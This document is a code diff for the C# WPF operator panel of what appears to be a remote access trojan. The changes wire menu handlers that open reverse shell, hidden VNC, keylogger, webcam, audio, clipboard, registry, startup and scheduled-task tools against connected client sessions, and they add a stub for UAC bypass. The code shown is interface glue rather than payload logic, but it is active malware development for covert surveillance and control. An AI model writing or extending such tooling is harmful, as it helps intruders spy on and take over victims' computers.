@@ -19,11 +19,6 @@ namespace Server.UI.Pages.ClientPage
             ClientHandler._sessions.CollectionChanged += UpdateClientGrid;
         }
 
-        private void OnMenuItemClick(object sender, RoutedEventArgs e)
-        {
-            
-        }
-
         private void UpdateClientGrid(object sender, NotifyCollectionChangedEventArgs e)
         {
             if (!Dispatcher.CheckAccess())
@@ -53,23 +48,37 @@ namespace Server.UI.Pages.ClientPage
             }
         }
 
-        private void DataGrid_LoadingRow(object sender, DataGridRowEventArgs e)
-        {
-            e.Row.ContextMenu = (ContextMenu)FindResource("utilityContextMenu");
-        }
-
         #region Global ContextMenu
         private void DataGrid_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
         {
             DataGrid dataGrid = sender as DataGrid;
             DataGridRow clickedRow = GetDataGridRowUnderMouse(dataGrid, e.GetPosition(dataGrid));
 
-            if (clickedRow == null)
+            if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift))
             {
-                dataGrid.SelectAll();
-                ContextMenu contextMenu = (ContextMenu)FindResource("globalContextMenu");
-                contextMenu.PlacementTarget = dataGrid;
-                contextMenu.IsOpen = true;
+                if (clickedRow == null)
+                {
+                    dataGrid.SelectAll();
+                    ContextMenu contextMenu = (ContextMenu)FindResource("globalContextMenu");
+                    contextMenu.PlacementTarget = dataGrid;
+                    contextMenu.IsOpen = true;
+                    e.Handled = true;
+                }
+            }
+            else
+            {
+                if (clickedRow != null)
+                {
+                    dataGrid.SelectedItems.Clear();
+                    clickedRow.IsSelected = true;
+
+                    ContextMenu contextMenu = (ContextMenu)FindResource("utilityContextMenu");
+                    contextMenu.PlacementTarget = clickedRow;
+                    contextMenu.IsOpen = true;
+                    e.Handled = true;
+
+                    serverSession = clickedRow.DataContext as ServerSession;
+                }
             }
         }
 
@@ -183,6 +192,11 @@ namespace Server.UI.Pages.ClientPage
         {
             serverSession.OpenUtilityWindow(new ReverseShell());
         }
+
+        private void UacBypass_Click(object sender, RoutedEventArgs e)
+        {
+
+        }
         #endregion
 
         #region Control
@@ -193,12 +207,12 @@ namespace Server.UI.Pages.ClientPage
 
         private void WebcamControl_Click(object sender, RoutedEventArgs e)
         {
-            
+            serverSession.OpenUtilityWindow(new WebcamControl(serverSession));
         }
 
         private void AudioManager_Click(object sender, RoutedEventArgs e)
         {
-            
+            serverSession.OpenUtilityWindow(new AudioManager(serverSession));
         }
 
         private void HVNC_Click(object sender, RoutedEventArgs e)
@@ -206,56 +220,80 @@ namespace Server.UI.Pages.ClientPage
             serverSession.OpenUtilityWindow(new HVNC(serverSession));
         }
 
-        private void KeyloggerOffline_Click(object sender, RoutedEventArgs e)
+        private void Keylogger_Click(object sender, RoutedEventArgs e)
         {
-            
-        }
-
-        private void KeyloggerOnline_Click(object sender, RoutedEventArgs e)
-        {
-            serverSession.OpenUtilityWindow(new Keylogger());
+            serverSession.OpenUtilityWindow(new Keylogger(serverSession));
         }
         #endregion
 
         #region Management
-        private void SystemManagement_Click(object sender, RoutedEventArgs e)
-        {
-            
-        }
-
-        private void NetworkManagement_Click(object sender, RoutedEventArgs e)
-        {
-            
-        }
-
         private void FileManager_Click(object sender, RoutedEventArgs e)
         {
-            serverSession.OpenUtilityWindow(new FileManager());
+            serverSession.OpenUtilityWindow(new FileManager(serverSession));
         }
 
         private void RegistryManager_Click(object sender, RoutedEventArgs e)
         {
-            
+            serverSession.OpenUtilityWindow(new RegistryManager(serverSession));
         }
 
         private void ClipboardManager_Click(object sender, RoutedEventArgs e)
         {
-            
+            serverSession.OpenUtilityWindow(new ClipboardManager(serverSession));
         }
 
+        private void TaskManager_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new TaskManager(serverSession));
+        }
+
+        private void ScheduledTasksManager_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new ScheduledTasksManager(serverSession));
+        }
+
+        private void NetworkManagement_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new NetworkManagement(serverSession));
+        }
+
+        private void StartUpManager_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new StartUpManager(serverSession));
+        }
+        #endregion
+
+        #region Middle Categories
         private void Recovery_Click(object sender, RoutedEventArgs e)
         {
-            
+
         }
 
         private void SystemOptions_Click(object sender, RoutedEventArgs e)
         {
-            serverSession.OpenUtilityWindow(new SystemOptions());
+            serverSession.OpenUtilityWindow(new SystemOptions(serverSession));
+        }
+        #endregion
+
+        #region Miscellaneous
+        private void OpenUrl_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new OpenUrl(serverSession));
         }
 
-        private void Miscellaneous_Click(object sender, RoutedEventArgs e)
+        private void ClientChat_Click(object sender, RoutedEventArgs e)
         {
-            
+            serverSession.OpenUtilityWindow(new ClientChat(serverSession));
+        }
+
+        private void ReportWindow_Click(object sender, RoutedEventArgs e)
+        {
+            serverSession.OpenUtilityWindow(new ReportWindow(serverSession));
+        }
+
+        private void IPGeoLocation_Click(object sender, RoutedEventArgs e)
+        {
+
         }
         #endregion
 
@@ -302,10 +340,5 @@ namespace Server.UI.Pages.ClientPage
             
         }
         #endregion
-
-        private void ContextMenu_Opened(object sender, RoutedEventArgs e)
-        {
-            serverSession = ((ServerSession)(((DataGridRow)((ContextMenu)sender).PlacementTarget)).DataContext);
-        }
     }
 }
